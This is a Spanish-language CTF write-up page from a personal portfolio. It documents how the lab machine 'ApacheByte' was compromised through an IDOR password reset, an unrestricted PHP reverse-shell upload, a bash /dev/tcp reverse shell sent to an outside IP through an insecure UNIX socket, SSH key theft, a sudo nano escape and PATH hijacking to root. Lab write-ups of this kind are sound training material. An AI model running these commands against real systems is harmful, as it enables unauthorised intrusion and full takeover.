@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ApacheByte</title>
+    <link href="../style/estilo.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeup.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <h1 class="text-4xl font-bold mb-2">🔹Máquina: APACHEBYTE</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el <!-- TODO: fecha --> | Categoría: WEB / FILE UPLOAD / IDOR / PRIVESC </p>
+
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Este reto consiste en comprometer una aplicación web construida en PHP que gestiona
+            cuentas de usuario, avatares y publicaciones de un blog. La cadena de explotación
+            combina un control de acceso insuficiente (IDOR) en el flujo de cambio de contraseña,
+            una subida de archivos sin ningún tipo de validación, y una escalada de privilegios en
+            varios saltos (www-data → juan → alex → root) apoyada en un socket UNIX inseguro, un
+            binario con permisos sudo mal configurado (GTFOBins) y un secuestro de ruta (path
+            hijacking) por variable de entorno.
+        </p>
+    </section>
+
+    <!----------------- Análisis ----------------------->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            Se comenzó con un escaneo de puertos completo:
+        </p>
+        <pre><code class="language-bash">
+sudo nmap -p- -open -sS --min-rate 5000 -n -Pn 172.17.0.2
+sudo nmap -p22,80 -sCV --min-rate 5000 172.17.0.2
+        </code></pre>
+
+        <img src="../Assets/apachebyte/2.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="resultado nmap">
+
+        <p class="text-gray-300 mt-4">
+            Se detectaron dos puertos abiertos: 22 (SSH) y 80 (Apache, sistema Ubuntu). Se realizó
+            descubrimiento de directorios sobre el servicio web:
+        </p>
+
+        <pre><code class="language-bash">
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
+        </code></pre>
+        <img src="../Assets/apachebyte/3.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="resultado gobuster">
+
+        <p class="text-gray-300 mt-4">
+            El sitio mostraba una página de bienvenida firmada por un usuario "manager", con opciones
+            de registro y login. Tras registrar una cuenta de prueba, se accedió a la sección
+            <code>account.php</code>, que exponía dos funcionalidades: subida de avatar y cambio de
+            contraseña.
+        </p>
+    </section>
+
+    <!-- Explotación -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Explotación</h2>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">1) IDOR en el cambio de contraseña</h3>
+        <p class="text-gray-300 mb-4">
+            La petición de cambio de contraseña usaba un parámetro <code>numero</code> como único
+            "token" de validación, sin solicitar la contraseña anterior ni ningún otro mecanismo:
+        </p>
+        <pre><code class="language-http">
+POST /account.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=manager&numero=5597527595641235&new_password=1234&confirm_password=1234
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Ese "número" resultó ser directamente el nombre del archivo de avatar del usuario,
+            expuesto por un <em>directory listing</em> habilitado sin autenticación:
+        </p>
+        <pre><code class="language-text">
+URL -> http://172.17.0.2/uploads/avatars/
+5597527595641235.jpg   (avatar del manager)
+        </code></pre>
+        <img src="../Assets/apachebyte/5.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="directory listing de avatars">
+
+        <p class="text-gray-300 mt-4">
+            El backend nunca verificaba que el <code>numero</code> perteneciera realmente al
+            <code>username</code> indicado, solo que ese valor existiera como nombre de archivo en
+            algún lado. Con esto se cambió la contraseña del usuario <code>manager</code> sin
+            conocer la anterior, obteniendo acceso a su panel con rol <code>admin</code>.
+        </p>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">2) RCE por subida de archivos sin restricciones</h3>
+        <p class="text-gray-300 mb-4">
+            Dentro del dashboard de administrador (<code>dashboard.php</code>) existía una gestión de
+            publicaciones (posts) con opción de subir imágenes. A diferencia del endpoint de avatar
+            (que sí validaba extensión y contenido), este endpoint de posts no aplicaba ninguna
+            restricción: se subió directamente una reverse shell en PHP con extensión
+            <code>.php</code>, sin necesidad de doble extensión ni ningún otro bypass.
+        </p>
+        <img src="../Assets/apachebyte/8.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="subida de shell.php">
+
+        <p class="text-gray-300 mt-4">
+            Al editar el post se reveló la ruta exacta donde había quedado guardado el archivo:
+        </p>
+        <pre><code class="language-html">
+&lt;img src="posts/uploads/Untitled.php" alt="Imagen subida" /&gt;
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Con un listener a la escucha, se accedió directamente a esa ruta y se obtuvo ejecución
+            remota de comandos como <code>www-data</code>:
+        </p>
+        <pre><code class="language-bash">
+nc -nlvp 4444
+# En el navegador:
+http://172.17.0.2/posts/uploads/Untitled.php
+        </code></pre>
+        <img src="../Assets/apachebyte/9.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="reverse shell como www-data">
+
+        <pre><code class="language-bash">
+www-data@fc04aa1c7111:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+        </code></pre>
+    </section>
+
+    <!-- Escalada de privilegios (sin imágenes) -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📈 Escalada de privilegios</h2>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">1) www-data → juan (credenciales de BD + socket UNIX inseguro)</h3>
+        <p class="text-gray-300 mb-4">
+            Revisando el código fuente de la aplicación se encontraron las credenciales de la base de
+            datos en texto plano:
+        </p>
+        <pre><code class="language-bash">
+cat /var/www/html/db.php
+
+$host = '127.0.0.1';
+$db   = 'web_app';
+$user = 'website';
+$pass = 'jJ2$uR5hR8z@LkT4';
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Con esas credenciales se volcó la tabla <code>users</code>, aunque los hashes bcrypt
+            recuperados no aportaron acceso adicional al sistema (son credenciales de la aplicación
+            web, no de usuarios del sistema operativo). El vector real de pivote apareció al listar
+            procesos: un socket UNIX corriendo como el usuario <code>juan</code>, con permisos
+            abiertos a cualquier usuario:
+        </p>
+        <pre><code class="language-bash">
+ps aux | grep -i juan
+juan   50  /usr/bin/python3 /home/juan/socket_server.py
+
+find / -writable 2>/dev/null | grep -v "^/proc\|^/sys" | xargs ls -la 2>/dev/null | grep juan
+srwxrwxrwx 1 juan juan 0 /tmp/dev.sock
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            El script del socket ejecutaba directamente cualquier dato recibido con <code>exec()</code>,
+            sin ningún tipo de sandboxing:
+        </p>
+        <pre><code class="language-python">
+import socket, os
+sock_path = "/tmp/dev.sock"
+server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+server.bind(sock_path)
+os.chmod(sock_path, 0o777)
+server.listen(1)
+while True:
+    conn, _ = server.accept()
+    data = conn.recv(2048)
+    if data:
+        try:
+            exec(data.decode(), {"__builtins__": __builtins__})
+            conn.send(b"Executed.\n")
+        except Exception as e:
+            conn.send(str(e).encode())
+    conn.close()
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Se abusó de este <code>exec()</code> sin restricciones para lanzar una reverse shell en el
+            contexto de <code>juan</code>:
+        </p>
+        <pre><code class="language-bash">
+nc -nlvp 4447
+
+echo "__import__('os').system('bash -c \"bash -i >& /dev/tcp/192.168.1.212/4447 >&1 0>&1\"')" | nc -U /tmp/dev.sock
+        </code></pre>
+        <pre><code class="language-bash">
+juan@d7a3f8de6cba:~$ id
+uid=1001(juan) gid=1001(juan) groups=1001(juan)
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Dentro del home de <code>juan</code> también se encontró una clave privada SSH, lo que
+            permitió reemplazar la shell inestable por una sesión persistente:
+        </p>
+        <pre><code class="language-bash">
+cat ~/.ssh/id_rsa
+# (copiar a la máquina atacante como juan-id_rsa)
+chmod 600 juan-id_rsa
+ssh -i juan-id_rsa juan@172.17.0.2
+        </code></pre>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">2) juan → alex (GTFOBins: sudo nano)</h3>
+        <p class="text-gray-300 mb-4">
+            El usuario <code>juan</code> tenía permiso para ejecutar <code>nano</code> como
+            <code>alex</code> sin contraseña:
+        </p>
+        <pre><code class="language-bash">
+juan@d7a3f8de6cba:~$ sudo -l
+User juan may run the following commands on d7a3f8de6cba:
+    (alex) NOPASSWD: /bin/nano
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Técnica documentada en GTFOBins para escapar de <code>nano</code> hacia una shell
+            interactiva:
+        </p>
+        <pre><code class="language-bash">
+sudo -u alex /bin/nano
+# Dentro del editor: Ctrl+R, Ctrl+X
+reset; sh 1>&0 2>&0
+        </code></pre>
+        <pre><code class="language-bash">
+$ id
+uid=1000(alex) gid=1000(alex) groups=1000(alex)
+        </code></pre>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">3) alex → root (path hijacking en report_tool)</h3>
+        <p class="text-gray-300 mb-4">
+            El usuario <code>alex</code> podía ejecutar un script propio como cualquier usuario, sin
+            contraseña:
+        </p>
+        <pre><code class="language-bash">
+$ sudo -l
+User alex may run the following commands on d7a3f8de6cba:
+    (ALL) NOPASSWD: /usr/local/bin/report_tool
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            El contenido del script reveló dos fallas de diseño: la ruta del archivo de configuración
+            era relativa (<code>./report_tool.conf</code>, dependiente del directorio desde el que se
+            invoque) y, si existía, permitía anteponer un directorio arbitrario al <code>PATH</code>
+            antes de ejecutar <code>date</code> sin ruta absoluta:
+        </p>
+        <pre><code class="language-bash">
+#!/bin/bash
+CONF_FILE="./report_tool.conf"
+if [ -r "$CONF_FILE" ]; then
+    source "$CONF_FILE"
+    if [ -n "$OVERRIDE_PATH" ]; then
+        export PATH="$OVERRIDE_PATH:$PATH"
+    fi
+fi
+exec date
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Se construyó un <code>date</code> falso que otorga SUID a <code>/bin/bash</code>, y se
+            forzó su ejecución colocando el archivo de configuración en el directorio de trabajo
+            actual:
+        </p>
+        <pre><code class="language-bash">
+cd /home/alex
+mkdir evil
+echo '#!/bin/bash' > evil/date
+echo 'chmod +s /bin/bash' >> evil/date
+chmod +x evil/date
+
+echo 'OVERRIDE_PATH="/home/alex/evil"' > report_tool.conf
+
+sudo /usr/local/bin/report_tool
+/bin/bash -p
+        </code></pre>
+        <pre><code class="language-bash">
+bash-5.2# id
+uid=1000(alex) gid=1000(alex) euid=0(root) egid=0(root) groups=0(root),1000(alex)
+        </code></pre>
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            Se obtuvo acceso root confirmado con <code>id</code>, combinando cinco fallas
+            encadenadas: un IDOR en el reset de contraseña apoyado en un directory listing abierto,
+            una subida de archivos sin ninguna validación de tipo o contenido, un socket UNIX
+            world-writable ejecutando código arbitrario sin sandboxing, un binario con permisos sudo
+            mal configurado (GTFOBins: <code>nano</code>), y un secuestro de ruta (path hijacking)
+            por variable de entorno en un script con ruta de configuración relativa. No se encontró
+            flag en <code>/root</code> (la plataforma de origen de esta máquina no utiliza flags,
+            el objetivo es demostrar el acceso root).
+        </p>
+    </section>
+
+    <div class="mt-10">
+        <a href="../writeup.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
